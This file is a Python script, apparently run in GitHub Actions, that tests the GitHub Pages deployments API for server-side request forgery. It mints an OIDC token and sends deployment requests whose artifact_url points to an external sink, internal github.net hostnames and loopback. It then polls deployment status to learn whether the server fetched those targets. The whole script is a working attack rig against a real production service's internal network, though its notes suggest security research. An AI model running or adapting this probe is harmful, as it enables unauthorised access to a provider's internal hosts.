import json, os, ssl, sys, time, urllib.request, urllib.error

RUN  = os.environ.get("GITHUB_RUN_ID","0")
REPO = os.environ["GITHUB_REPOSITORY"]
SHA  = os.environ["GITHUB_SHA"]
ART  = os.environ.get("ART_ID","").strip()
GH   = os.environ["GH_TOKEN"]
SINK = os.environ.get("SINK","").rstrip("/")
API  = "https://api.github.com"

def http(url, method="GET", body=None, hdrs=None, timeout=30):
    req = urllib.request.Request(url, method=method,
          data=json.dumps(body).encode() if body is not None else None)
    for k,v in (hdrs or {}).items(): req.add_header(k,v)
    if body is not None: req.add_header("Content-Type","application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ssl.create_default_context()) as r:
            return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return -1, f"<transport:{type(e).__name__}:{e}>"

GHH = {"Authorization": f"Bearer {GH}", "Accept": "application/vnd.github+json",
       "X-GitHub-Api-Version": "2022-11-28"}

print("=== ARMS-START ===", flush=True)
try:
    # ---- OIDC mint, with an ARMING GATE that refuses to let the run emit a verdict ----
    idu = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")
    idt = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
    print(f"[oidc] request_url_present={bool(idu)} request_token_present={bool(idt)}", flush=True)
    s,b = http(idu, hdrs={"Authorization": f"bearer {idt}"})
    tok = ""
    try: tok = json.loads(b).get("value","") or ""
    except Exception: pass
    print(f"[oidc] mint HTTP {s}  token_len={len(tok)}", flush=True)
    if len(tok) < 20:
        print("🔴 ARMING GATE FAILED: no usable OIDC token. EVERY arm below would measure the "
              "schema check, not the fetcher. Emitting NO verdict.", flush=True)
        sys.exit(0)
    print(f"[rig] artifact_id_from_THIS_run={ART!r}  sha={SHA[:12]}  repo={REPO}", flush=True)
    if not ART:
        print("🔴 ARMING GATE FAILED: upload-artifact produced no artifact-id output.", flush=True)
        sys.exit(0)

    DEP = f"{API}/repos/{REPO}/pages/deployments"
    base = {"pages_build_version": SHA, "oidc_token": tok}
    PASSES_VALIDATOR = "https://x.actions.githubusercontent.com/_apis/pipelines/1/runs/1/artifacts"

    # destinations: a real internal name PAIRED WITH AN INVENTED TWIN, or the negative
    # is unfalsifiable. plus a public reachable canary = the FETCH-PROOF control.
    D = {
      "pubreach" : f"{SINK}/A-pubreach-{RUN}",
      "ghnet_real": f"https://ssrf-target.iad.github.net/zzq-{RUN}.tar",
      "ghnet_fake": f"https://ssrf-target-qq7x4z.iad.github.net/zzq-{RUN}.tar",
      "loopback"  : f"http://127.0.0.1:8080/zzq-{RUN}.tar",
    }

    ARMS = [
      ("A0 schema-floor      {ver,oidc}",                         dict(base)),
      ("A1 POSITIVE CONTROL  +artifact_id(this run)",             dict(base, artifact_id=int(ART))),
      ("A2 validator path    +artifact_url(allowlisted shape)",   dict(base, artifact_url=PASSES_VALIDATOR)),
      ("A3 extra-property    +artifact_id +zzq_nonsense",         dict(base, artifact_id=int(ART), zzq_nonsense=1)),
      ("A4 BYPASS pubreach   +artifact_id +artifact_url",         dict(base, artifact_id=int(ART), artifact_url=D["pubreach"])),
      ("A5 BYPASS ghnet-REAL +artifact_id +artifact_url",         dict(base, artifact_id=int(ART), artifact_url=D["ghnet_real"])),
      ("A6 BYPASS ghnet-FAKE +artifact_id +artifact_url",         dict(base, artifact_id=int(ART), artifact_url=D["ghnet_fake"])),
      ("A7 BYPASS loopback   +artifact_id +artifact_url",         dict(base, artifact_id=int(ART), artifact_url=D["loopback"])),
      ("A8 url-only ghnet    +artifact_url(no id)",               dict(base, artifact_url=D["ghnet_real"])),
    ]

    res = []
    for label, body in ARMS:
        s,b = http(DEP, "POST", body, GHH)
        one = " ".join(b.split())[:230]
        did = None
        try: did = json.loads(b).get("id")
        except Exception: pass
        res.append((label, s, one, did, body))
        # label DERIVED from the value only -- never a hard-coded interpretation
        print(f"  {label:<48} -> {s}  id={did}  {one}", flush=True)
        time.sleep(1.5)

    a1 = [r for r in res if r[0].startswith("A1")][0]
    print("\n=== INSTRUMENT VERDICT (derived, three branches) ===", flush=True)
    if a1[1] == 404:
        print("🔴 VOID: the POSITIVE CONTROL (A1, artifact_id alone, uploaded by THIS run) returned 404. "
              "The artifact_id family is UNARMED, so every bypass arm is unattributable in BOTH "
              "directions. This reproduces my 10-14 void and REFUTES the 'same-run binding' "
              "hypothesis from obs 78d64c83.", flush=True)
    elif 200 <= a1[1] < 300:
        print(f"✅ ARMED: A1 returned {a1[1]}. The artifact_id path resolves for a same-run artifact, "
              "so the bypass arms carry information and the 10-14 void WAS a rig defect.", flush=True)
    else:
        print(f"◻ A1 returned {a1[1]} (neither 2xx nor 404) — read its body above; the id path is "
              "reached but refusing for a stated reason.", flush=True)

    # ---- post-state: the deployment's OWN status is the destination oracle ----
    live = [(l,d) for (l,s,b,d,_) in res if d]
    if live:
        print(f"\n=== POST-STATE: polling {len(live)} created deployment(s) — the status IS the oracle ===", flush=True)
        for wait in (20, 40, 70):
            time.sleep(wait if wait==20 else wait-20)
            print(f"  --- t+{wait}s ---", flush=True)
            for l,d in live:
                s,b = http(f"{API}/repos/{REPO}/pages/deployments/{d}", hdrs=GHH)
                print(f"    {l[:26]:<26} dep={d} HTTP {s} {' '.join(b.split())[:200]}", flush=True)
    else:
        print("\n=== POST-STATE: no deployment id returned by any arm, nothing to poll ===", flush=True)
finally:
    print("=== ARMS-END ===", flush=True)
